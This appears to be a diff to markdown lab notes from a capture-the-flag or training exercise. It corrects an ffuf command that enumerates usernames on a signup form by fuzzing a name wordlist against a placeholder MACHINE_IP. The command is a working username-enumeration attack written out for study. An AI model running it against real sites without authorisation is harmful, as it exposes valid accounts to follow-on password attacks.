@@ -69,7 +69,7 @@ guest <- another potential username
 * Capture the request in `Burp` to find the `Content-Type`, whether its a `GET` or `POST`
 
 ```
-ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://MACHINE_IP/customers/signup -mr "username already exists"
+ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt:FUZZ -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://MACHINE_IP/customers/signup -mr "username already exists"
 ```
 
 * `-w` -> selects the file's location
